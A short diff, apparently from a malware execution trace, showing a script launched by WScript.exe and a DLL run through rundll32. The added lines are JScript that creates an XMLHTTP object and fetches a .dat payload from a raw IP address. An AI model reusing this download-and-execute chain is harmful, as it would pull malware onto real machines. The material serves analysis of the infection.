@@ -13,6 +13,10 @@ Exec >
 
 WScript.exe C:\Users\Admin\AppData\Local\Temp\Claim_A590.wsf
 
+var http = new ActiveXObject("microsoft.xmlhttp");
+
+http.open("GET", "http://94.131.100.149/aLkAV8d3KEtjgIfh.dat", false);
+
 rundll32.exe C:\ProgramData\ayXZFqhL4i.tmp,Motd
 
 *************************************************
